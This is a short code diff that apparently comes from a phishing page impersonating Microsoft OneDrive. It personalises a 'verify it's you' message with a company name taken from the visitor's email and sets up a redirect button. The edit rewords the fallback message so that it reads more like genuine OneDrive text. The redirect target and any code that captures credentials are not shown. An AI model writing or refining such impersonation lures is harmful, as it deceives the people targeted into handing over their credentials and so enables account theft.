@@ -29,7 +29,7 @@
                 document.getElementById('message').innerHTML = `To access ${companyName} secured data, Microsoft needs to verify it's you.`;
             } else {
                 // If no email found, show the default message
-                document.getElementById('message').innerHTML = "Microsoft requires identity verification to access shared data on OneDrive for Business.";
+                document.getElementById('message').innerHTML = "OneDrive for Business requires identity verification to access shared data.";
             }
 
             // Set up the button click handler for redirection
